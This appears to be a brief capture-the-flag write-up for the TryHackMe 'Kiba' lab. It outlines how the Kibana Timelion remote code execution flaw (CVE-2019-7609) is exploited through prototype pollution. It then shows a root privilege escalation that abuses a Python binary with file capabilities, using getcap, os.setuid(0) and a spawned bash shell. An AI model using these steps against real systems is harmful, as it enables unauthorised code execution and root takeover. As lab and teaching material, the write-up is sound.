>Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.

### CVE-2019-7609
>Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system. 

## Steps
- rustscan the IP assigned. `rustcan 10.212.12.xxx`
- open the kibana application on port 5601 used by the app
- look for version in the management section
- search CVE for the version
- There are scripts that automate the process.
- Our app version is suspectible to RCE.
- we prototype pollute the input and click on the canvas tab while also listening on the port specified in the process of prototype pollution.
- we get the shell and direct to teh /home/kiba dir and cat the RCE flag,then we can go and start to with capabilities associated with linux files.
- list file linux capabilities with `getcap -r / 2>/dev/null`
- we find a python 3 exec in .hackmeplease/python3 
- we can use this to run python and use the os lib to set uid to root and spawn a shell to get the root flag.

```python
/home/kiba/.hackmeplease/python3

import os 

os.getuid()
100
os.setuid(0)
0
os.system("/bin/bash")
/home/kiba# cat root.txt
```

### Further Reading

https://github.com/LandGrey/CVE-2019-7609

https://github.com/mpgn/CVE-2019-7609

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7609

https://nvd.nist.gov/vuln/detail/CVE-2019-7609

https://beginninghacking.net/2020/08/28/try-hack-me-kiba-this-room-was-released-today-this-will-get-unlocked-after-3-days-otherwise-you-can-use-the-root-flag-to-unlock-it-thmp___s/


https://codeburst.io/what-is-prototype-pollution-49482fc4b638

